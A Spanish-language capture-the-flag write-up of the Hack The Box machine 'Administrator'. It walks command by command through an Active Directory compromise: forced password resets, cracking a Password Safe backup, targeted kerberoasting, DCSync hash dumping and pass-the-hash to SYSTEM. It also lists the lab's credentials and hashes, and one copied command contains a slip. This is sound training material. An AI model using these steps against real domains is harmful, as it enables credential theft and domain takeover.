![Administrator](https://github.com/user-attachments/assets/2af46ed6-0e04-4601-b561-1854d79a580e)

Este escenario parte de una situación de brecha asumida, por lo que se nos proporcionan credenciales válidas desde el inicio.

olivia:ichliebedich

Empezamos realizando un escaneo de puertos abiertos en la máquina objetivo.

``sudo nmap 10.10.11.42 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![Pasted image 20250407124206](https://github.com/user-attachments/assets/6a9eeacb-8c1e-476d-8871-f3cda5378cfc)

Una vez conocemos el listado de puertos abiertos, realizamos un segundo escaneo sobre estos puertos para saber qué servicios y versiones están corriendo.

``nmap 10.10.11.42 -sCV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,54343,57656,57667,57672,57675,57694 -oN target``

![Pasted image 20250407124352](https://github.com/user-attachments/assets/2acabdbd-45c4-467f-93f9-4b82f0989589)

Empezamos a ver cosas interesantes y típicas de un DC: Kerberos, LDAP, SMB, DNS (no siempre), junto con un dominio y una posible entrada a la máquina por winrm.

Para seguir enumerando información de la máquina, vamos a utilizar netexec.

``netexec smb 10.10.11.42``

![Pasted image 20250407124155](https://github.com/user-attachments/assets/8365f77e-2371-4ad3-87f3-0ce1e8838249)

Confirmamos dominio -> administrator.htb

Nombre de la máquina ->  DC

Windows -> Server 2022

Podemos añadir esta información a nuestro /etc/hosts

![Pasted image 20250407124311](https://github.com/user-attachments/assets/c1a51576-7426-455f-bff1-5d4ec6238915)


Como tenemos credenciales válidas a nivel de dominio, vamos a enumerar el resto de usuarios a través de RPC:

``rpcclient -U 'olivia%ichliebedich' 10.10.11.42' ``

-> enumdomusers

![Pasted image 20250407124641](https://github.com/user-attachments/assets/29958246-d8ac-42e9-93a4-d71152a875b4)

Vamos a guardarnos el output (rpcusers.txt) para posteriormente hacer un tratamiento a los datos y quedarnos con los nombres de usuario (el contenido del primer corchete).

``cat rpcusers.txt | cut -d '[' -f2 | cut -d ']' -f1 > users.txt; cat users.txt``

![Pasted image 20250407124954](https://github.com/user-attachments/assets/17d62246-6b23-4578-affb-90cdbd14483b)

Vamos a seguir enumerando. Como tiene servidor DNS, podemos hacer uso de la herramienta bloodhound-python para enumerar el dominio proporcionando credenciales desde fuera del mismo sin necesidad de compartir SharpHound.

- Levantamos neo4j

``sudo neo4j start``

![Pasted image 20250407125334](https://github.com/user-attachments/assets/16a19fdb-082e-491d-9458-fd07a277e046)

- Levantamos bloodhound

``bloodhound --no-sandbox &>/dev/null & disown``

- Introducimos nuestras credenciales de neo4j.

- Enumeramos el dominio con BloodHound-Python:

``bloodhound-python -u 'olivia' -p 'ichliebedich' -d administrator.htb -c all -ns 10.10.11.42``

![Pasted image 20250407125531](https://github.com/user-attachments/assets/2548e5cb-dc1c-47b1-858a-acb8198f0e87)

- Una vez hemos recolectado la información y la tenemos en los archivos .json generados, los subimos a su interfaz gráfica:

![Pasted image 20250313132148](https://github.com/user-attachments/assets/36620eb5-f1ee-4477-b027-4bec66481734)

- Marcamos como owned al usuario olivia porque tenemos sus credenciales.

Empezamos a darle uso a BloodHound.

Por ejemplo, si observamos la información del usuario Olivia: tiene GenericAll sobre el usuario Michael.

![Pasted image 20250407125924](https://github.com/user-attachments/assets/9e71d1fc-a999-46b5-b3d3-d3e9d4c15b82)

![Pasted image 20250407125933](https://github.com/user-attachments/assets/81bb4dc7-ee0e-49e8-aaeb-1866dd11d777)

Entre otras cosas, lo que podemos hacer es cambiar su contraseña.

``net rpc password michael -U 'olivia' -S 10.10.11.42``

-> Introducimos nueva contraseña para michael: test123!

-> Introducimos la contraseña de olivia (ichliebedich)

![Pasted image 20250407133757](https://github.com/user-attachments/assets/80a80a84-379c-4183-9696-85c1f8902ccc)


- Comprobamos con netexec que, efectivamente, se ha cambiado la contraseña del usuario michael:

``netexec smb 10.10.11.42 -u 'michael' -p 'test123!'``

![Pasted image 20250407133851](https://github.com/user-attachments/assets/023fc735-de92-4aff-b001-372e7c7d53e9)

Estupendo, hemos cambiado la contraseña del usuario Michael. Marcamos en BloodHound al usuario Michael como owned.


¿Podemos conectarnos con evil-winrm? Vamos a comprobar si el usuario michael forma parte del grupo RemoteManagementUser:

![Pasted image 20250407133932](https://github.com/user-attachments/assets/e2de7ab3-bd66-47f1-9dad-82e89217f4b9)

Estupendo, podemos entrar también en el sistema como el usuario michael.

Si seguimos enumerando a través de BloodHound con el usuario michael, vemos que podemos forzar el cambio de contraseña de Benjamin:

![Pasted image 20250407134117](https://github.com/user-attachments/assets/d529da29-71e1-4957-b8fc-6f0dfb0c6719)

![Pasted image 20250407134059](https://github.com/user-attachments/assets/c34c4b19-31d2-45d8-8d94-62c324683377)


Realizamos lo mismo que hicimos anteriormente para cambiar al contraseña de Michael, pero en este caso para Benjamin.

``net rpc password michael -U 'olivia' -S 10.10.11.42``

-> Introducimos nueva contraseña para benjamin: test123!

-> Introducimos la contraseña de michael (test123!)

![Pasted image 20250407134221](https://github.com/user-attachments/assets/e6d80f5e-71e6-4de9-8e8c-1d6faaa0024e)


Validamos las credenciales para corroborar que hemos modificado la contraseña de benjamin:

``netexec smb 10.10.11.42 -u 'benjamin' -p 'test123!'``

![Pasted image 20250407134257](https://github.com/user-attachments/assets/53e2fac5-b5ea-464b-a791-88ae6c2dfe29)

Comprobamos con netexec si podemos utilizar evil-winrm con Benjamin, pero no nos aparece [+] Pwn3d!, por lo que no puede conectarse por winrm.

Credenciales hasta ahora:
- olivia : ichliebedich
- michael : test123!
- benjamin : test123!

Sin embargo, existen otros servicios para los que podemos utilizar las credenciales que tenemos hasta ahora. Por ejemplo, con el usuario benjamin podemos loguearnos por ftp:

![Pasted image 20250407134718](https://github.com/user-attachments/assets/aa77cfaf-2160-4632-93f0-482d91f40f81)


``ftp 10.10.11.42``

![Pasted image 20250407134740](https://github.com/user-attachments/assets/06f6f1b1-f7a2-4792-be4e-c97ed751e1a1)

Dentro del servidor ftp vemos un archivo llamado Backup.psafe3. Nos lo traemos a nuestra máquina:

``get Backup.psafe3``

![Pasted image 20250407134834](https://github.com/user-attachments/assets/0c73e5a3-06fa-4a63-ab61-3f05a7cd7532)


Si hacemos un file del archivo para ver cómo lo identifica a través de los magic numbers:

``file Backup.psafe3``

![Pasted image 20250407144952](https://github.com/user-attachments/assets/957347cd-ec9e-4778-b1cd-b9d281a5a185)

Password Safe v3 database. Parece un backup de una base de datos usuarios y contraseñas, pero vamos a indagar un poco.

Según google:

``Los archivos PSAFE3 pertenecen principalmente a Password Safe. Password Safe le permite crear de forma segura y sencilla una lista segura y encriptada de nombres de usuario/contraseñas. Con Password Safe todo lo que tiene que hacer es crear y recordar una única contraseña maestra de su elección para desbloquear y acceder a toda su lista de nombres de usuario/contraseñas.``

Confirmamos que es un gestor de contraseñas. Necesitamos la contraseña maestra para acceder a los datos que tiene almacenados, lo que nos debería permitir obtener nuevas credenciales.

Si investigamos un poco, vemos que hashcat tiene un código interno para intentar crackear este tipo de archivos:

``hashcat --help | grep -i 'password safe'``

![Pasted image 20250407142923](https://github.com/user-attachments/assets/04d7ca2a-5a1f-4e3b-bea9-89a6ae6c79c4)

Vale, el código interno para PasswordSafe v3 es 5200.

Una vez sabemos el código interno de hashcat, lanzamos hashcat con rockyou como diccionario:

``hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockou.txt --force``

![Pasted image 20250407144805](https://github.com/user-attachments/assets/0db35a46-f8b4-4ecb-baf0-3b8a90f9d3b1)


Otra opción habría sido pasarle el archivo Backup.psafe3 a pwsafe2john (similar a zip2john o ssh2john), lo que generaría un archivo que john sí puede intentar crackear.

Saca tekieromucho como contraseña maestra. Esto podría cuadrarnos a nivel de CTF ya que la contraseña de Olivia es "ichliebedich", que en alemán significa exactamente "te quiero mucho".

Si miramos un poco la documentación de pwsafe:

- https://pwsafe.org/help/pwsafeEN/html/cli.html

Tenemos que hacer uso de  la herramienta pwsafe. Y si no la tenemos: ``sudo apt install pwsafe``

Una vez tenemos la herramienta:

``pwsafe Backup.psafe3``

Esto nos abre de forma gráfica una especie de panel de autenticación que nos pide la contraseña maestra / combinación segura:

![Pasted image 20250407145359](https://github.com/user-attachments/assets/44e8755b-55b8-4095-917c-dfb0a29a0ff6)

Probamos con tekieromucho.

Funciona:

![Pasted image 20250407145421](https://github.com/user-attachments/assets/dc6ed0ac-263c-4bad-b14c-af32c1863d2f)


Haciendo doble click sobre cualquiera de ellos nos copiará su contraseña. Se obtiene:

- alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw

- emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb

- emma : WwANQWnmJnGV07WQN8bMS7FMAbjNur

Añadimos estas contraseña a pass.txt (junto con las dos que teníamos antes, la contraseña inicial de olivia y la contraseña que hemos cambiado anteriormente a los dos usuarios):

![Pasted image 20250407145637](https://github.com/user-attachments/assets/ff5477ac-125c-491b-b2c4-1b4524b270cc)


Utilizamos netexec para validar las contraseñas del gestor de contraseñas. Importante el parámetro ``--continue-on-sucess`` para que no se detenga con el primer acierto.

``netexec smb 10.10.11.42 -u users.txt -p pass.txt --continue-on-success``

Nos confirma cosas que ya sabíamos:

![Pasted image 20250407145747](https://github.com/user-attachments/assets/53341265-fdfe-4034-8aff-6cab3f7e3fd3)

![Pasted image 20250407145758](https://github.com/user-attachments/assets/87c9b1e8-dcfa-4498-8188-e3114e9bd020)

Pero también nos confirma algo nuevo:

![Pasted image 20250407145828](https://github.com/user-attachments/assets/e853b144-7401-43f0-9a77-945710a66480)

emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb, son credenciales válidas.

Hasta ahora tenemos:

![Pasted image 20250407145929](https://github.com/user-attachments/assets/7aaccbc6-3e58-4cb3-8f75-ce29fb89e019)

 
A su vez, vamos a ver si emily puede hacer uso de winrm porque forme parte del grupo Remote Management Users:

``netexec winrm 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'``

![Pasted image 20250407150125](https://github.com/user-attachments/assets/fab4623d-dcd0-4d97-a2a8-c65cdff7694f)

Tenemos Pwn3d!, por lo que podemos conectarnos con evil-winrm con las credenciales de emily.

``evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'``

En C:\Users\emily\Desktop encontramos la flag de usuario.

![Pasted image 20250407150316](https://github.com/user-attachments/assets/a83f3ac6-54ec-4c56-a73d-dc7f15a85a10)


# PRIVESC

Vamos a bloodhound y marcamos emily como usuario owned y vamos a ver qué podemos hacer desde ahí:

![Pasted image 20250407150521](https://github.com/user-attachments/assets/721f267c-1f0f-435d-8aa9-fb52af55f906)

![Pasted image 20250407150537](https://github.com/user-attachments/assets/ec82d650-fc43-404e-b378-cd1a9b73a48a)

Resulta que el usuario Emily tiene GenericWrite sobre Ethan. El siguiente recurso es bastante bueno para aprender sobre ello:

https://www.hackingarticles.in/abusing-ad-dacl-genericwrite/

Lo que se va a hacer es añadir un SPN (ServicePrincipalName) a la cuenta de usuario objetivo. Desde el momento que la cuenta tiene un SPN asociado, es vulnerable a kerberoasting. Esta técnica se conoce como "targeted kerberoasting".

Si lanzamos directamente targetedKerberoast.py da problema por desincronización de reloj.

-> Primero tenemos que sincronizar el reloj (que confieso que ha costado más que en otras ocasiones):

```
sudo timedatectl set-ntp off
sudo rdate -n IPobjetivo
```

![Pasted image 20250407174254](https://github.com/user-attachments/assets/44cad985-e4d2-4b78-9c60-866a7bc27a9b)

![Pasted image 20250407174305](https://github.com/user-attachments/assets/88adc61b-6f11-4cb6-bad6-eaa03bc9373f)


Una vez está sincronizado (desde sudo), lo corremos:

``sudo python3 targetedKerberoast.py -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'``

Curiosamente con --dc-ip 10.10.11.42 daba error, pero sin ello no.

![Pasted image 20250407174323](https://github.com/user-attachments/assets/039dce30-f1a5-4db3-8592-f6e2e1b82503)

Estupendo, nos saca el TGS del usuario ethan, y por tanto, podemos intentar crackearlo con hashcat para obtener sus credenciales. Nos lo copiamos al archivo ethankerberoasthash.

A su vez, podemos volver a setear en on:

``sudo timedatectl set-ntp on``

Le pasamos el hash a hashcat con rockyou como diccionario:

``hashcat -m 13100 ethankerberoasthash /usr/share/wordlists/rockyou.txt --force``

![Pasted image 20250407175039](https://github.com/user-attachments/assets/dcf37aee-7f10-45c1-9846-85712a76cf61)

ethan : limpbizkit

Validamos credenciales de ethan:

``netexec smb 10.10.11.42 -u ethan -p 'limpbizkit'``

![Pasted image 20250407175340](https://github.com/user-attachments/assets/80fac2b2-9c21-44d9-afbc-3601b1b8bb7b)

Genial, tenemos [+], por lo que son credenciales válidas.

Marcamos como owned a Ethan en el BloodHound. Y si observamos qué cosas podemos hacer con este usuario, vemos:

![Pasted image 20250407175725](https://github.com/user-attachments/assets/ca1306dc-b674-4dbd-ac8d-4718cdc74ba0)

Ojo, podemos hacer DCSync con Ethan, por lo que podemos volcar todos los hashes LM:NTLM de los usuarios del dominio.

``impacket-secretsdump DC=administrator,DC=htb/'ethan':'limpbizkit'@'10.10.11.42'``

![Pasted image 20250407175925](https://github.com/user-attachments/assets/cde60685-52db-493e-87e6-4dc70e147c83)

Cogemos el hash NTLM de Administrator y nos lo guardamos (``3dc553ce4b9fd20bd016e098d2d2fd2e``). Podríamos intentar crackearlo, o podemos hacer directamente pass the hash.

Vamos a validar este hash NTLM para el usuario Administrador.

``netexec smb 10.10.11.42 -u Administrator -H ':3dc553ce4b9fd20bd016e098d2d2fd2e'``

![Pasted image 20250407184233](https://github.com/user-attachments/assets/a0ebfb8e-15e6-430b-9e3d-a4aee5730935)

Tenemos Pwn3d!, y por tanto, podemos hacer uso de psexec o wmiexec.

``impacket-psexec administrator@10.10.11.42 -hashes ':3dc553ce4b9fd20bd016e098d2d2fd2e'``

![Pasted image 20250407184431](https://github.com/user-attachments/assets/98d6552c-49e7-4dd8-8c6a-2f0023dd96a8)

Estamos dentro de la máquina objetivo como NtAuthority\system.

En C:\Users\Administrator\Desktop recogemos la flag de administrador.

![Pasted image 20250407184548](https://github.com/user-attachments/assets/246bd324-79f0-40f2-844e-9984820ee068)


